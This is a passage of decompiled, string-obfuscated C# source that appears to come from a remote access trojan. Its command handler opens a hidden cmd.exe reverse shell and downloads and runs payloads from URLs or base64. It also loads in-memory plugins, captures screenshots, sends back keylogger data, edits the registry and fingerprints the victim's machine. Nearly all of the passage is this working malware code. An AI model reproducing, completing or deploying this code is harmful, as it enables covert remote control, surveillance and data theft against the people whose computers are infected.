					if (!capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint uint_0, uint uint_1, [Out] StringBuilder stringBuilder_0, int int_0);

	public string method_14(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			int localeInfo = GetLocaleInfo(1024u, uint_0, stringBuilder, stringBuilder.Capacity);
			if (localeInfo > 0)
			{
				return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return new string(new char[1] { 'X' });
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long long_0);

	public string method_15()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					string string_ = new string(new char[1] { ' ' });
					return method_6(ref string_);
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string string_2 = Strings.StrDup(windowTextLengthA + 1, new string(new char[1] { '*' }));
				GetWindowTextA(foregroundWindow, ref string_2, windowTextLengthA + 1);
				int int_ = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref int_);
				if (int_ != 0)
				{
					try
					{
						string string_ = Process.GetProcessById(int_).MainWindowTitle;
						return method_6(ref string_);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = method_6(ref string_2);
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return method_6(ref string_2);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string string_ = new string(new char[1] { ' ' });
				string result = method_6(ref string_);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_4);

	public string method_16()
	{
		try
		{
			string string_ = Interaction.Environ(GClass4.smethod_0("XųɺͼѢիفݶࡪॴ\u0a64")) + GClass4.smethod_0("]");
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = new string(new char[3] { 'E', 'R', 'R' });
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[STAThread]
	public static void Main()
	{
		GClass2 gClass = new GClass2();
		gClass.method_0();
	}

	private void method_17()
	{
		method_23(0);
	}

	public object method_18(byte[] byte_0, string string_11)
	{
		object obj = Assembly.Load(byte_0);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return NewLateBinding.LateGet(obj, (Type)null, GClass4.smethod_0("Mſɩ\u036aѾլفݩ\u0875ॱ\u0a65୭ౡ\u0d64"), new object[1] { Strings.Split(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), GClass4.smethod_0("-"), -1, (CompareMethod)0)[0] + GClass4.smethod_0("/") + string_11 }, (string[])null, (Type[])null, (bool[])null);
	}

	private void method_19(object object_4, object object_5)
	{
		try
		{
			string text = new string(new char[2] { 'r', 's' });
			string text2 = string_8;
			string string_ = Conversions.ToString(NewLateBinding.LateGet(object_5, (Type)null, GClass4.smethod_0("@Ţɶ\u0360"), new object[0], (string[])null, (Type[])null, (bool[])null));
			string text3 = method_6(ref string_);
			NewLateBinding.LateSetComplex(object_5, (Type)null, GClass4.smethod_0("@Ţɶ\u0360"), new object[1] { string_ }, (string[])null, (Type[])null, true, false);
			method_25(text + text2 + text3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_20()
	{
		try
		{
			method_25(new string(new char[3] { 'r', 's', 'c' }));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_21(byte[] byte_0)
	{
		//IL_164a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1651: Expected O, but got Unknown
		string[] array = Strings.Split(method_10(ref byte_0), string_8, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				if (Operators.CompareString(text, new string(new char[3] { 'r', 's', 's' }), false) == 0)
				{
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, GClass4.smethod_0("OŪɮ\u036d"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					object_1 = new Process();
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("DŰɰͺѠմٳݻ\u085dॹ੭\u0b65౮൨\u0e7aལ၉ᅰተ፳ᑷᕵ"), new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Gűɷͻѣյ٬ݺ࡞ॸ੪\u0b64౭൩\u0e75ར၌ᅪታ፷ᑵ"), new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Gűɷͻѣյ٬ݺ࡞ॸ੪\u0b64౭൩\u0e75ར၀ᅶቱ፭ᑳ"), new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("NŮɪ\u0360ъբٯݤ"), new object[1] { new char[7] { 'c', 'm', 'd', '.', 'e', 'x', 'e' } }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Gűɷͻѣյ٬ݺ࡞ॸ੪\u0b64౭൩\u0e75ར၀ᅶቱ፭ᑳ"), new object[1] { true }, (string[])null, (Type[])null, false, true);
					((Process)object_1).OutputDataReceived += method_19;
					((Process)object_1).ErrorDataReceived += method_19;
					((Process)object_1).Exited += delegate
					{
						method_20();
					};
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("ZŽɨ\u035fѣկ٥ݤࡂॾ\u0a60୧\u0c76൶\u0e64"), new object[1] { false }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Mſɩ\u036aѾլنݨࡑ६੪୧౭൶"), new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("ZżɦʹѱՍ٭ݤ\u086e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("\\ţɧ\u036cѨձ\u0656ݰ\u087a८\u0a64"), new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSet(object_1, (Type)null, GClass4.smethod_0("VżɰͲѣի\u065fݭࡢॹ\u0a60୦ౠ\u0d43\u0e73ཡ\u106dᅶቲ"), new object[1] { true }, (string[])null, (Type[])null);
					method_25(new string(new char[3] { 'r', 's', 's' }));
					NewLateBinding.LateCall(object_1, (Type)null, GClass4.smethod_0("VŰɢͰѵ"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(object_1, (Type)null, GClass4.smethod_0("PŴɷ\u0366ѠՈپݹࡥॻਗ਼\u0b62౧ൡ\u0e48ཪ\u106cᅤ"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(object_1, (Type)null, GClass4.smethod_0("Qŷɶ\u0379ѡՁٸݸ\u087bॿ\u0a7d\u0b5a\u0c62൧\u0e61\u0f48\u106aᅬቤ"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'r', 's' }), false) == 0)
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(object_1, (Type)null, GClass4.smethod_0("^Ÿɪ\u0364ѭթٵݢࡌ४ੳ୷\u0c75"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("^źɮͲѠՈ٪ݬࡤ"), new object[1] { method_7(ref array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'r', 's', 'c' }), false) == 0)
				{
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, GClass4.smethod_0("OŪɮ\u036d"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					object_1 = null;
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'k', 'l' }), false) == 0)
				{
					method_25(new string(new char[2] { 'k', 'l' }) + string_8 + method_6(ref gclass3_0.string_1));
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'i', 'n', 'f' }), false) == 0)
				{
					string text2 = new string(new char[3] { 'i', 'n', 'f' }) + string_8;
					if (Operators.CompareString(method_2(GClass4.smethod_0("tů")), GClass4.smethod_0(""), false) == 0)
					{
						string text3 = text2;
						string string_ = method_7(ref string_0) + new string(new char[1] { '_' }) + method_16();
						text2 = text3 + method_6(ref string_) + string_8;
					}
					else
					{
						string text4 = text2;
						string string_ = method_2(GClass4.smethod_0("tů"));
						string string_2 = method_7(ref string_) + GClass4.smethod_0("^") + method_16();
						text2 = text4 + method_6(ref string_2) + string_8;
					}
					text2 = text2 + string_6 + new string(new char[1] { ':' }) + string_7 + string_8;
					text2 = text2 + string_4 + string_8;
					text2 = text2 + string_3 + string_8;
					text2 += Process.GetCurrentProcess().ProcessName;
					method_25(text2);
				}
				else if (Operators.CompareString(text, new string(new char[4] { 'p', 'r', 'o', 'f' }), false) == 0)
				{
					string text5 = array[1];
					if (Operators.CompareString(text5, new string(new char[1] { '~' }), false) == 0)
					{
						method_3(array[2], array[3]);
					}
					else if (Operators.CompareString(text5, new string(new char[1] { '!' }), false) == 0)
					{
						method_3(array[2], array[3]);
						method_25(new string(new char[8] { 'g', 'e', 't', 'v', 'a', 'l', 'u', 'e' }) + string_8 + array[1] + string_8 + method_2(array[1]));
					}
					else if (Operators.CompareString(text5, new string(new char[1] { '~' }), false) == 0)
					{
						method_1(array[2]);
					}
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'r', 'n' }), false) == 0)
				{
					byte[] array2 = null;
					if (!array[2].ToLower().StartsWith(new string(new char[4] { 'h', 't', 't', 'p' })))
					{
						byte[] byte_ = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array2 = method_12(byte_, ref bool_);
					}
					else
					{
						object obj = new WebClient();
						string text6 = GClass4.smethod_0("HŤɽ\u0367Ѥը٧ݡࡀ\u0962੶ୠ");
						object[] array3 = new object[1];
						object[] array4 = array3;
						int num = 2;
						array4[0] = array[2];
						object[] array5 = array3;
						object[] array6 = array5;
						bool[] array7 = new bool[1] { true };
						object obj2 = NewLateBinding.LateGet(obj, (Type)null, text6, array6, (string[])null, (Type[])null, array7);
						if (array7[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
						array2 = (byte[])obj2;
					}
					method_25(new string(new char[3] { 'b', 'l', 'a' }));
					string text7 = Interaction.Environ(GClass4.smethod_0("pŦɯͱ")) + GClass4.smethod_0("]") + method_8(10) + GClass4.smethod_0("/") + array[1];
					File.WriteAllBytes(text7, array2);
					Process.Start(text7);
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'i', 'n', 'v' }), false) == 0)
				{
					method_25(new string(new char[3] { 'b', 'l', 'a' }));
					string text8 = method_2(array[1]);
					byte[] array8;
					if (text8.Length > 0)
					{
						array8 = Convert.FromBase64String(text8);
						method_25(new string(new char[2] { 'p', 'l' }) + string_8 + array[1] + string_8 + Conversions.ToString(0));
					}
					else
					{
						if (array[3].Length == 1)
						{
							method_25(GClass4.smethod_0("rŭ") + string_8 + array[1] + string_8 + GClass4.smethod_0("CťɯͱѤ"));
							return;
						}
						byte[] byte_2 = Convert.FromBase64String(array[3]);
						bool bool_ = false;
						array8 = method_12(byte_2, ref bool_);
						if (Conversions.ToBoolean(method_3(array[1], Convert.ToBase64String(array8))))
						{
							method_25(new string(new char[2] { 'p', 'l' }) + string_8 + array[1] + string_8 + Conversions.ToString(0));
						}
					}
					object objectValue = RuntimeHelpers.GetObjectValue(method_18(array8, new string(new char[1] { 'A' })));
					NewLateBinding.LateSet(objectValue, (Type)null, GClass4.smethod_0("i"), new object[1] { string_6 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, GClass4.smethod_0("q"), new object[1] { string_7 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, GClass4.smethod_0("lűɪ"), new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue, (Type)null, GClass4.smethod_0("vŰɢͰѵ"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!bool_2), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, GClass4.smethod_0("LŤɧ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue, (Type)null, GClass4.smethod_0("lŤɧ"), new object[1] { true }, (string[])null, (Type[])null);
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'r', 'e', 't' }), false) == 0)
				{
					method_25(new string(new char[3] { 'b', 'l', 'a' }));
					string text9 = method_2(array[1]);
					byte[] array9;
					if (text9.Length > 0)
					{
						array9 = Convert.FromBase64String(text9);
						method_25(new string(new char[2] { 'p', 'l' }) + string_8 + array[1] + string_8 + Conversions.ToString(0));
					}
					else
					{
						if (array[2].Length == 1)
						{
							method_25(GClass4.smethod_0("rŭ") + string_8 + array[1] + string_8 + GClass4.smethod_0("Pűɷ\u0364"));
							return;
						}
						byte[] byte_3 = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array9 = method_12(byte_3, ref bool_);
						if (Conversions.ToBoolean(method_3(array[1], Convert.ToBase64String(array9))))
						{
							method_25(new string(new char[2] { 'p', 'l' }) + string_8 + array[1] + string_8 + Conversions.ToString(0));
						}
					}
					object objectValue2 = RuntimeHelpers.GetObjectValue(method_18(array9, new string(new char[1] { 'A' })));
					string[] array10 = new string[5]
					{
						new string(new char[3] { 'r', 'e', 't' }),
						string_8,
						array[1],
						string_8,
						null
					};
					string[] array11 = array10;
					string string_2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, GClass4.smethod_0("Eŕ"), new object[0], (string[])null, (Type[])null, (bool[])null));
					array11[4] = method_6(ref string_2);
					method_25(string.Concat(array10));
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'C', 'A', 'P' }), false) == 0)
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(width, rectangle.Height);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle = new Rectangle(position, size);
						@default.Draw(val2, rectangle);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					val2.Dispose();
					MemoryStream memoryStream = new MemoryStream();
					string string_2 = new string(new char[3] { 'C', 'A', 'P' }) + string_8;
					byte_0 = method_9(ref string_2);
					memoryStream.Write(byte_0, 0, byte_0.Length);
					MemoryStream memoryStream2 = new MemoryStream();
					IntPtr intPtr = default(IntPtr);
					((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
					memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
					method_24(memoryStream.ToArray());
					memoryStream.Dispose();
					memoryStream2.Dispose();
					((Image)val).Dispose();
				}
				else if (Operators.CompareString(text, new string(new char[1] { 'P' }), false) == 0)
				{
					method_25(new string(new char[1] { 'P' }));
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'u', 'n' }), false) == 0)
				{
					string text10 = array[1];
					if (Operators.CompareString(text10, new string(new char[1] { '~' }), false) == 0)
					{
						method_27();
					}
					else if (Operators.CompareString(text10, new string(new char[1] { '!' }), false) == 0)
					{
						method_23(0);
						ProjectData.EndApp();
					}
					else if (Operators.CompareString(text10, new string(new char[1] { '@' }), false) == 0)
					{
						method_23(0);
						Type typeFromHandle = typeof(Process);
						string text11 = GClass4.smethod_0("VŰɢͰѵ");
						object[] array5 = new object[1];
						object[] array12 = array5;
						object obj3 = object_0;
						array12[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null));
						object[] array3 = array5;
						object[] array13 = array3;
						bool[] array7 = new bool[1] { true };
						NewLateBinding.LateCall((object)null, typeFromHandle, text11, array13, (string[])null, (Type[])null, array7, true);
						if (array7[0])
						{
							NewLateBinding.LateSetComplex(obj3, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[1] { RuntimeHelpers.GetObjectValue(array3[0]) }, (string[])null, (Type[])null, true, false);
						}
						ProjectData.EndApp();
					}
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'u', 'p' }), false) == 0)
				{
					byte[] array14 = null;
					if (!array[1].ToLower().StartsWith(new string(new char[4] { 'h', 't', 't', 'p' })))
					{
						byte[] byte_4 = Convert.FromBase64String(array[1]);
						bool bool_ = false;
						array14 = method_12(byte_4, ref bool_);
					}
					else
					{
						object obj4 = new WebClient();
						string text12 = GClass4.smethod_0("HŤɽ\u0367Ѥը٧ݡࡀ\u0962੶ୠ");
						object[] array15 = new object[1];
						object[] array16 = array15;
						int num = 1;
						array16[0] = array[1];
						object[] array5 = array15;
						object[] array17 = array5;
						bool[] array7 = new bool[1] { true };
						object obj5 = NewLateBinding.LateGet(obj4, (Type)null, text12, array17, (string[])null, (Type[])null, array7);
						if (array7[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
						array14 = (byte[])obj5;
					}
					method_25(new string(new char[3] { 'b', 'l', 'a' }));
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ"), new object[2]
					{
						GClass4.smethod_0("fŨ"),
						GClass4.smethod_0("")
					}, (string[])null, (Type[])null, (bool[])null, true);
					string text13 = Interaction.Environ(GClass4.smethod_0("pŦɯͱ")) + GClass4.smethod_0("]") + method_8(10) + GClass4.smethod_0("*Ŧɺ\u0364");
					File.WriteAllBytes(text13, array14);
					Process.Start(text13, new string(new char[3] { 'U', 'P', ':' }) + Conversions.ToString(Process.GetCurrentProcess().Id));
					int num2 = 0;
					do
					{
						Thread.Sleep(10);
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("OŢɲ\u0353ѥկٷݤ"), new object[2]
						{
							GClass4.smethod_0("fŨ"),
							GClass4.smethod_0("")
						}, (string[])null, (Type[])null, (bool[])null), (object)GClass4.smethod_0(" "), false))
						{
							method_27();
						}
						num2++;
					}
					while (num2 <= 500);
				}
				else
				{
					if (Operators.CompareString(text, new string(new char[2] { 'R', 'G' }), false) != 0)
					{
						return;
					}
					object obj6 = method_22(array[2]);
					string text14 = array[1];
					if (Operators.CompareString(text14, new string(new char[1] { '~' }), false) == 0)
					{
						string text15 = GClass4.smethod_0("Pņ") + string_8 + GClass4.smethod_0("\u007f") + string_8 + array[2] + string_8;
						string text16 = GClass4.smethod_0("");
						IEnumerator enumerator = default(IEnumerator);
						try
						{
							enumerator = ((IEnumerable)NewLateBinding.LateGet(obj6, (Type)null, GClass4.smethod_0("IŨɸ\u0358ѿիكݢ\u087f\u094b\u0a65୮౧൲"), new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator.MoveNext())
							{
								string text17 = Conversions.ToString(enumerator.Current);
								if (!text17.Contains(new string(new char[1] { '\\' })))
								{
									text16 = text16 + text17 + string_8;
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						IEnumerator enumerator2 = default(IEnumerator);
						try
						{
							enumerator2 = ((IEnumerable)NewLateBinding.LateGet(obj6, (Type)null, GClass4.smethod_0("Jũɿ\u035cѨդٲݣࡋ॥੮୧\u0c72"), new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator2.MoveNext())
							{
								string text18 = Conversions.ToString(enumerator2.Current);
								string[] array10 = new string[7]
								{
									text16,
									text18,
									GClass4.smethod_0("."),
									null,
									null,
									null,
									null
								};
								string[] array18 = array10;
								string text19 = GClass4.smethod_0("KŮɾ\u035fѩիٳݠࡏ४੬\u0b65");
								object[] array19 = new object[1] { text18 };
								object[] array20 = array19;
								bool[] array21 = new bool[1] { true };
								object obj7 = NewLateBinding.LateGet(obj6, (Type)null, text19, array20, (string[])null, (Type[])null, array21);
								if (array21[0])
								{
									text18 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array19[0]), typeof(string));
								}
								array18[3] = obj7.ToString();
								array10[4] = GClass4.smethod_0(".");
								string[] array22 = array10;
								string text20 = GClass4.smethod_0("OŢɲ\u0353ѥկٷݤ");
								object[] array5 = new object[2]
								{
									text18,
									GClass4.smethod_0("")
								};
								object[] array23 = array5;
								bool[] array7 = new bool[2] { true, false };
								object obj8 = NewLateBinding.LateGet(obj6, (Type)null, text20, array23, (string[])null, (Type[])null, array7);
								if (array7[0])
								{
									text18 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
								}
								array22[5] = obj8.ToString();
								array10[6] = string_8;
								text16 = string.Concat(array10);
							}
						}
						finally
						{
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						method_25(text15 + text16);
					}
					else if (Operators.CompareString(text14, new string(new char[1] { '!' }), false) == 0)
					{
						string text21 = GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ");
						object[] array19 = new object[3];
						object[] array24 = array19;
						int num = 3;
						array24[0] = array[3];
						object[] array25 = array19;
						int num3 = 4;
						array25[1] = array[4];
						object[] array26 = array19;
						int num4 = 5;
						array26[2] = array[5];
						object[] array15 = array19;
						object[] array27 = array15;
						bool[] array21 = new bool[3] { true, true, true };
						NewLateBinding.LateCall(obj6, (Type)null, text21, array27, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
						if (array21[1])
						{
							array[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
						}
						if (array21[2])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[2]), typeof(string));
						}
					}
					else if (Operators.CompareString(text14, new string(new char[1] { '@' }), false) == 0)
					{
						string text22 = GClass4.smethod_0("Oůɥ\u036dѳգ\u0653ݥ\u086fॷ\u0a64");
						object[] array19 = new object[2];
						object[] array28 = array19;
						int num4 = 3;
						array28[0] = array[3];
						array19[1] = false;
						object[] array15 = array19;
						object[] array29 = array15;
						bool[] array21 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj6, (Type)null, text22, array29, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
					}
					else if (Operators.CompareString(text14, new string(new char[1] { '#' }), false) == 0)
					{
						string text23 = GClass4.smethod_0("OŹɯ\u0368Ѽբ\u0655ݰࡦ\u0948੧\u0b78");
						object[] array19 = new object[1];
						object[] array30 = array19;
						int num4 = 3;
						array30[0] = array[3];
						object[] array15 = array19;
						object[] array31 = array15;
						bool[] array21 = new bool[1] { true };
						NewLateBinding.LateCall(obj6, (Type)null, text23, array31, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
					}
					else if (Operators.CompareString(text14, new string(new char[1] { '$' }), false) == 0)
					{
						string text24 = GClass4.smethod_0("TŪɢ\u0368Ѹծ\u0659ݼࡪ\u094c\u0a63\u0b7c\u0c50൱\u0e67ཤ");
						object[] array19 = new object[1];
						object[] array32 = array19;
						int num4 = 3;
						array32[0] = array[3];
						object[] array15 = array19;
						object[] array33 = array15;
						bool[] array21 = new bool[1] { true };
						NewLateBinding.LateCall(obj6, (Type)null, text24, array33, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				try
				{
					method_25(new string(new char[2] { 'E', 'R' }) + string_8 + array[0] + string_8 + ex2.Message);
					if ((Operators.CompareString(array[0], GClass4.smethod_0("wű"), false) == 0) | (Operators.CompareString(array[0], GClass4.smethod_0("pů"), false) == 0))
					{
						method_25(new string(new char[3] { 'b', 'l', 'a' }));
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public RegistryKey method_22(string string_11)
	{
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HŦɨͻѴգٶݖ\u086c७\u0a75"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
